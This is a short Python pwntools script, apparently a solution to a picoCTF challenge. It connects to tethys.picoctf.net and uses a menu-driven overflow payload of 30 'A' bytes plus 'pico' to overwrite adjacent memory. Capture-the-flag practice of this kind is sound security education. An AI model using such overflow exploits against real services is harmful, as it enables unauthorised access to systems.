from pwn import *

p = remote('tethys.picoctf.net',50126)

sla = p.sendlineafter

padding = b"A" * 30
pico = b"pico"

pay = padding + pico

def exp():
    sla(b"choice: ",b"2")
    sla(b": ", b"35")
    sla(b": ", pay)
    sla(b": ", b"5")
    sla(b": ", b"2")
    sla(b": ", b"35")
    sla(b": ", pay)
    sla(b": ", b"4")

exp()

p.interactive()
